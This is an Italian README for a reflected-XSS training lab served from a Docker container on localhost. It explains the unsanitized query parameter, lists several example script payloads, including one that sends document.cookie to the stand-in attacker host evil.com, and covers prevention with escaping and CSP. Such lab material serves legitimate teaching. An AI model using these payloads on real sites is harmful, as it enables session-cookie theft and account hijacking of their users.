# Challenge 1 - Reflected XSS

Questa challenge è stata creata per dimostrare il concetto di Cross-Site Scripting (XSS) Reflected, un tipo di vulnerabilità web che permette l'iniezione di codice JavaScript malevolo.

## Obiettivo
Lo scopo di questa challenge non è trovare una flag specifica, ma comprendere come funziona un attacco XSS Reflected e come può essere utilizzato per eseguire codice JavaScript arbitrario nel contesto di una pagina web.

## Come funziona
La challenge presenta un'applicazione web con una funzionalità di ricerca. Il parametro `q` nella query string viene riflesso direttamente nella pagina HTML senza alcuna sanitizzazione.

## Esempio di attacco
Puoi provare a iniettare codice JavaScript in diversi modi:

1. Alert semplice:
```
http://localhost:801/?q=<script>alert(1)</script>
```

2. Visualizzare i cookie:
```
http://localhost:801/?q=<script>alert(document.cookie)</script>
```

3. Redirect a un altro sito:
```
http://localhost:801/?q=<script>window.location.href="https://evil.com"</script>
```

4. Inviare dati a un server controllato dall'attaccante:
```
http://localhost:801/?q=<script>fetch('https://evil.com?cookie='+document.cookie)</script>
```

## Come funziona l'attacco
1. L'utente inserisce del codice JavaScript malevolo nel campo di ricerca
2. Il server riflette questo input direttamente nella pagina HTML
3. Il browser interpreta il JavaScript riflesso come codice eseguibile
4. Il codice viene eseguito nel contesto della pagina web

## Implicazioni di sicurezza
- Il codice JavaScript viene eseguito nel contesto della pagina web
- Può accedere a:
  - Cookie del dominio
  - DOM della pagina
  - Local Storage
  - Session Storage
  - E altre risorse accessibili via JavaScript

## Prevenzione
Per prevenire attacchi XSS, è importante:
1. Sanitizzare tutti gli input utente
2. Utilizzare escape appropriati per i dati riflessi
3. Implementare Content Security Policy (CSP)
4. Utilizzare framework che gestiscono automaticamente la sanitizzazione

## Note
In un ambiente reale, queste vulnerabilità potrebbero essere sfruttate per:
- Furto di cookie
- Furto di dati sensibili
- Manipolazione del DOM
- Reindirizzamenti malevoli
- Esecuzione di azioni non autorizzate

## Avviare il server:
```bash
docker pull ghcr.io/ax3lt/xss-ch1
docker run -p 80:80 ghcr.io/ax3lt/xss-ch1
```

Buona fortuna! 🚀🔓
